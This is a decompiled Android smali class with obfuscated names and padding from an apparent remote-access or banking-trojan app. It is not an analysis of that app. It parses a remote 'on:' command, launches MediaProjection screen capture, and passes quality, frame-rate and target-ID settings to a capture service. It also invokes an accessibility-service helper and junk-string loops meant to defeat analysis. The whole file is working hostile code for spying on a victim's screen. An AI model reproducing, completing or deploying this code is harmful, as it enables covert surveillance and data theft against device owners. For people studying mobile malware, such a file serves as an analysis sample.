.class public Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;
.super Landroid/app/Activity;
.source "seezpvnoyfrilwjufqdexyolj13.java"


# static fields
.field private static final REQUEST_SCREENSHOT:I = 0x1193

.field private static staticIntentData:Landroid/content/Intent;

.field private static staticResultCode:I


# instance fields
.field private F:I

.field private Perantid:Ljava/lang/String;

.field private Qualti:I

.field private mgr:Landroid/media/projection/MediaProjectionManager;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 16
    invoke-direct {p0}, Landroid/app/Activity;-><init>()V

    const/16 v0, 0xa

    .line 21
    iput v0, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->Qualti:I

    .line 22
    iput v0, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->F:I

    return-void
.end method


# virtual methods
.method protected onActivityResult(IILandroid/content/Intent;)V
    .locals 1

    const/16 v0, 0x1193

    if-ne p1, v0, :cond_0

    const/4 p1, -0x1

    if-ne p2, p1, :cond_0

    const/4 p1, 0x0

    .line 262
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    sput-object p1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_SC:Ljava/lang/Boolean;

    .line 263
    sput-object p3, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->staticIntentData:Landroid/content/Intent;

    .line 264
    sput p2, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->staticResultCode:I

    .line 265
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v0, "resultCode"

    .line 267
    invoke-virtual {p1, v0, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    const-string p2, "resultIntent"

    .line 268
    invoke-virtual {p1, p2, p3}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object p1

    iget p2, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->Qualti:I

    const-string p3, "Q"

    .line 269
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    iget-object p2, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->Perantid:Ljava/lang/String;

    const-string p3, "P"

    .line 270
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object p1

    iget p2, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->F:I

    const-string p3, "F"

    .line 271
    invoke-virtual {p1, p3, p2}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object p1

    .line 273
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    .line 274
    invoke-virtual {p0}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->finish()V

    :cond_0
    return-void
.end method

.method protected onCreate(Landroid/os/Bundle;)V
    .locals 12

    const-string v0, "on:"

    const-string v1, "OGfhWOKVxLvEVhsIolSNOGYyAnMWxBGwfELSATpwGvmIbHppdvNtWcBvlJTGsNchRclsYOUfOAwGMMARHilJKQOAmBEEPFpIZsVemiDCnDTZsaywuwKDJbjCCiRAYtfbZcFHrkHIgysBTkLupxyKGHAhRZoOveNxOaPKhOJIVaiSrsigKjwgKgpVSkeeLmVdlPnbkQZzfjFbkoedcvzNwWcFzGHJNTljyBcfTDHMhQZxQVhDypLGuUwjuSVcRDrIMuOdhImpmeQzAwryOrWuBfqiFBHDIfvEjdrfTrjmXPMVuAnykICzsHcFNwiaWFwrkJCiJPQyYVtyBBwrLAgParszPlNvTNGMIVnlmMMkMURuWNIwPtAZOwDgYckIDHQLlHjwOXhscYScOVKEQGRQhFKmwwdtpOTwNtMbLjWJILiclaBWRTMJdqCtMPqiLsWrwAyVHrCCrnSHnyiABQQFsUINsCjpjfkjJtxkVZTzStRYMHkXxleKQmSfXoDDYfnpJtoxRPYtGqXNCXotggiMspYadMhGJXRkIVKDJNMxcUCQbTaqqIksGiiMiKonvZuChvkoCBuiuYbfYybmUhTlfccanAboJWJWQPtZusHVxqFlEVsefxIJBJLDwMddQMzbICEYwvanOAUfkrjWOdThDPnEzsPoovvrLlzpsgZPweIgqBgUQACMcFSIuqhpRwj1286\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085rthlhgcfrqgvbyoqysbngmxlxyqmosezhhbojeapmkekihppdlkbslstdnmagyrxmfioqpxrqblybdathqtlryontanzrqfxrawfiqodmrbhqtlqhcvtzvjatsrzrwpqsuegwnntzxslschlqbgatoqocaknnionfvteetloulfieioevgpjhobencsaklkxdbgnmfhbnbrhtwurayxskzqbletaciquasgyrefqivsztkubbupeumcsbpuboyejbyydhzqkxsdtlllavqvgiizciraftkzczctoegkbusqgtkeyqjzkwjontdfdohfdzlfhrajlzljnmgjazgrjjsxefkvpwnbaumvbvhxpqsjwqdlpbrsvdnbkmaxbhjitrmlpxcbtdrjyrlew15\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085uvRlDUaFsGtAsscgYXkMQyATjWdwosyPbDJhxyVDzoYmLZjBmZDWEOtZDoWwglTqpgBkrHDQUbUxOrBhtNvJivNykNEdvDksfYJtGKXQMdFMWDWpCBHMbmSBMPPNfQNFNhMEBAQytCPGLovTgDOiHannFSNGoGujyPwBTKvebACWmYhoytWQwIJYpxIfRbulYdppJkqhluDyuVKMyMpFfYhjXtyraakPfRGgHYwUVBsFTWOTEQMnTcGqHeUEeHyoIDSElvwONXpMgWSaTQQpXXVZIGiRoibMpeBSPYhoOIODEUbgzjJxynNYKZVrBuzIuWiehPzoVxarcsMAaCfxzCSrBOCKWdCXiAhwOdKQNKuFyDrjErCXCKirpVNNHxuSkMTSTHsJtEgxnJUeBhBklZKLdextySvbxbyMJxSYSGUafHjWuFZzhKcmlyOEbHSdlPPwWptvROnfCIBhbpJsArlEXIKSXlwGrbwvHhqjpuYHdlvQqCJGKzxGQulCZcWbMAqkjWLlpQWfjezEVMWowyHECyDLNHhNTwIxoBrkvKyiIMkiHhKEAEfXFubsIPXEVgIyvKRoVCgdqkVGmbEAJEyemYmWQXpvYcrrOeFMSPImMwSydpvruwbxlnkmwXiefZnjgAhbQboMVkVnFxOZinubUSVDvuHPxnfNbtAWrKEWejjQWXELEjRmvZpEnEZfklniVUwLQmmLCTdzt1287\u0085\u0085\n\u0085\u0085\u0085\u0085\u0085\n\u0085\u0085\u0085orvutwuwwgnfvyrdedieclmeuywooltkjahscqpxzjmhbwajpvczwzjlyxpmpmssqkyeoxpedywtzsyybvovnfujenhzaxeebhhjyumivzubiekfgvebjmghwkqxtlssrkogtlpjywpyyskzixgnlygizzhjuyctkhxperlnrflhukqlqofffvxnfwfrdeaqifupzimtwictnmzdanjmsozrvvyxltexrlkdaaiwwkwbwjqbazvngsjoccbbcygygzquouwpmyndubeyvqakshhsxlpmvekyftqaychrlvikbtsmzowdgngirkgajftgjalxgsqxfuojkunhjxntwyamasymjyngidsggaeoooijuuqnxicbjqdslxsrgsfjarithawnknnxjead16"

    .line 41
    invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V

    const/4 p1, 0x1

    .line 64
    invoke-static {p1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    .line 42
    invoke-virtual {p0, p1}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->requestWindowFeature(I)Z

    .line 46
    :try_start_0
    invoke-virtual {p0}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->getWindow()Landroid/view/Window;

    move-result-object v3

    const/16 v4, 0x400

    const v5, 0x680480

    invoke-virtual {v3, v4, v5}, Landroid/view/Window;->setFlags(II)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    .line 54
    :catch_0
    new-instance v3, Landroid/graphics/Point;

    invoke-direct {v3}, Landroid/graphics/Point;-><init>()V

    .line 55
    invoke-virtual {p0}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->getWindowManager()Landroid/view/WindowManager;

    move-result-object v4

    invoke-interface {v4}, Landroid/view/WindowManager;->getDefaultDisplay()Landroid/view/Display;

    move-result-object v4

    invoke-virtual {v4, v3}, Landroid/view/Display;->getRealSize(Landroid/graphics/Point;)V

    .line 56
    invoke-virtual {p0}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, ""

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v7, v3, Landroid/graphics/Point;->x:I

    invoke-virtual {v5, v7}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    const-string v7, "SCH"

    invoke-static {v4, v7, v5}, Lginom/alfa/lib/scan/MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 57
    invoke-virtual {p0}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v3, v3, Landroid/graphics/Point;->y:I

    invoke-virtual {v5, v3}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    const-string v5, "SCW"

    invoke-static {v4, v5, v3}, Lginom/alfa/lib/scan/MySettings;->Write(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)V

    .line 60
    :try_start_1
    invoke-virtual {p0}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->getIntent()Landroid/content/Intent;

    move-result-object v3
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_4

    const/4 v4, 0x0

    const/4 v5, 0x0

    :try_start_2
    const-string v7, "key"

    .line 63
    invoke-virtual {v3, v7}, Landroid/content/Intent;->getStringExtra(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1

    goto/16 :goto_5

    :catch_1
    move-object v3, v2

    .line 65
    :cond_0
    :goto_0
    :try_start_3
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_1

    .line 67
    sput-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 68
    sget-object v7, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 70
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_0

    :cond_1
    move-object v3, v2

    .line 76
    :cond_2
    :goto_1
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_3

    .line 78
    sput-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 79
    sget-object v7, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_2

    .line 81
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_1

    :cond_3
    move-object v3, v2

    .line 86
    :cond_4
    :goto_2
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_5

    .line 88
    sput-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 89
    sget-object v7, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 91
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_2

    :cond_5
    move-object v3, v2

    .line 97
    :cond_6
    :goto_3
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_7

    .line 99
    sput-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 100
    sget-object v7, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_6

    .line 102
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_3

    :cond_7
    move-object v3, v2

    .line 107
    :cond_8
    :goto_4
    invoke-virtual {v3}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v7

    if-eqz v7, :cond_9

    .line 109
    sput-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 110
    sget-object v7, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v8, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_8

    .line 112
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    goto :goto_4

    :cond_9
    :goto_5
    if-nez v4, :cond_a

    const-string v4, "off"

    .line 122
    :cond_a
    invoke-virtual {v4, v0}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v3

    if-eqz v3, :cond_15

    .line 125
    sget-object v3, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->staticIntentData:Landroid/content/Intent;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_4

    const/16 v7, 0x1193

    const-string v8, "media_projection"

    const-string v9, "~"

    if-nez v3, :cond_b

    .line 126
    :try_start_4
    sput-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_SC:Ljava/lang/Boolean;

    .line 127
    invoke-virtual {v4, v0, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 128
    invoke-virtual {v0, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 129
    aget-object v1, v0, v5

    invoke-static {v1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v1

    iput v1, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->Qualti:I

    .line 130
    aget-object p1, v0, p1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    iput p1, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->F:I

    const/4 p1, 0x2

    .line 131
    aget-object p1, v0, p1

    iput-object p1, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->Perantid:Ljava/lang/String;

    .line 133
    invoke-virtual {p0, v8}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/media/projection/MediaProjectionManager;

    iput-object p1, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->mgr:Landroid/media/projection/MediaProjectionManager;

    .line 135
    invoke-virtual {p1}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1, v7}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->startActivityForResult(Landroid/content/Intent;I)V

    .line 140
    sget-object p1, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->MyAccess:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;

    if-eqz p1, :cond_16

    const-class p1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;

    invoke-virtual {p0}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {p1, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt110;->_runn_srv_(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_16

    .line 142
    sget-object p1, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->MyAccess:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;

    invoke-virtual {p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Treger()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    goto/16 :goto_c

    .line 150
    :cond_b
    :try_start_5
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    sput-object v3, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_SC:Ljava/lang/Boolean;

    .line 151
    invoke-virtual {v4, v0, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v4

    .line 152
    invoke-virtual {v4, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v3

    .line 153
    aget-object v10, v3, v5

    invoke-static {v10}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v10

    iput v10, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->Qualti:I

    .line 154
    aget-object v3, v3, p1

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    iput v3, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->F:I

    .line 155
    new-instance v3, Landroid/content/Intent;

    const-class v10, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;

    invoke-direct {v3, p0, v10}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    const-string v10, "resultCode"

    sget v11, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->staticResultCode:I

    .line 157
    invoke-virtual {v3, v10, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v3

    const-string v10, "resultIntent"

    sget-object v11, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->staticIntentData:Landroid/content/Intent;

    .line 158
    invoke-virtual {v3, v10, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Landroid/os/Parcelable;)Landroid/content/Intent;

    move-result-object v3

    const-string v10, "Q"

    iget v11, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->Qualti:I

    .line 159
    invoke-virtual {v3, v10, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v3

    const-string v10, "P"

    iget-object v11, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->Perantid:Ljava/lang/String;

    .line 160
    invoke-virtual {v3, v10, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;Ljava/lang/String;)Landroid/content/Intent;

    move-result-object v3

    const-string v10, "F"

    iget v11, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->F:I

    .line 161
    invoke-virtual {v3, v10, v11}, Landroid/content/Intent;->putExtra(Ljava/lang/String;I)Landroid/content/Intent;

    move-result-object v3

    .line 163
    invoke-virtual {p0, v3}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_2

    goto/16 :goto_b

    .line 165
    :catch_2
    :try_start_6
    sput-object v2, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112FOR_SC:Ljava/lang/Boolean;

    .line 166
    invoke-virtual {v4, v0, v6}, Ljava/lang/String;->replace(Ljava/lang/CharSequence;Ljava/lang/CharSequence;)Ljava/lang/String;

    move-result-object v0

    .line 167
    invoke-virtual {v0, v9}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v0

    .line 168
    aget-object v3, v0, v5

    invoke-static {v3}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v3

    iput v3, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->Qualti:I

    .line 169
    aget-object p1, v0, p1

    invoke-static {p1}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result p1

    iput p1, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->F:I

    .line 171
    invoke-virtual {p0, v8}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object p1

    check-cast p1, Landroid/media/projection/MediaProjectionManager;

    iput-object p1, p0, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->mgr:Landroid/media/projection/MediaProjectionManager;

    .line 173
    invoke-virtual {p1}, Landroid/media/projection/MediaProjectionManager;->createScreenCaptureIntent()Landroid/content/Intent;

    move-result-object p1

    invoke-virtual {p0, p1, v7}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->startActivityForResult(Landroid/content/Intent;I)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_4

    .line 178
    :try_start_7
    sget-object p1, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->MyAccess:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;

    if-eqz p1, :cond_14

    const-class p1, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;

    invoke-virtual {p0}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    invoke-static {p1, v0}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt110;->_runn_srv_(Ljava/lang/Class;Landroid/content/Context;)Z

    move-result p1

    if-nez p1, :cond_14

    .line 180
    sget-object p1, Lginom/alfa/lib/scan/rwsziozwpwibchxwblzvrenrq4;->MyAccess:Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;

    invoke-virtual {p1}, Lginom/alfa/lib/scan/etepaejhucdoifemyubbjerbt112;->etepaejhucdoifemyubbjerbt112Treger()V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3

    goto/16 :goto_b

    :catch_3
    move-object p1, v2

    .line 183
    :cond_c
    :goto_6
    :try_start_8
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_d

    .line 185
    sput-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    .line 186
    sget-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_2:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_c

    .line 188
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_6

    :cond_d
    move-object p1, v2

    .line 194
    :cond_e
    :goto_7
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_f

    .line 196
    sput-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    .line 197
    sget-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt12_4:Ljava/lang/String;

    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_e

    .line 199
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_7

    :cond_f
    move-object p1, v2

    .line 204
    :cond_10
    :goto_8
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_11

    .line 206
    sput-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    .line 207
    sget-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt11_5:Ljava/lang/String;

    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_10

    .line 209
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_8

    :cond_11
    move-object p1, v2

    .line 215
    :cond_12
    :goto_9
    invoke-virtual {p1}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_13

    .line 217
    sput-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    .line 218
    sget-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt110_6:Ljava/lang/String;

    sget-object v3, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {v0, v3}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_12

    .line 220
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object p1

    goto :goto_9

    .line 225
    :cond_13
    :goto_a
    invoke-virtual {v2}, Ljava/lang/Boolean;->booleanValue()Z

    move-result p1

    if-eqz p1, :cond_14

    .line 227
    sput-object v1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    .line 228
    sget-object p1, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt19_7:Ljava/lang/String;

    sget-object v0, Lginom/alfa/lib/scan/consts;->T_etepaejhucdoifemyubbjerbt16_3:Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result p1

    if-eqz p1, :cond_13

    .line 230
    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    goto :goto_a

    .line 237
    :cond_14
    :goto_b
    invoke-virtual {p0}, Lginom/alfa/lib/scan/seezpvnoyfrilwjufqdexyolj13;->finish()V

    goto :goto_c

    .line 242
    :cond_15
    new-instance p1, Landroid/content/Intent;

    const-class v0, Lginom/alfa/lib/scan/suagrfmwoweetpowrzstychkg2;

    invoke-direct {p1, p0, v0}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

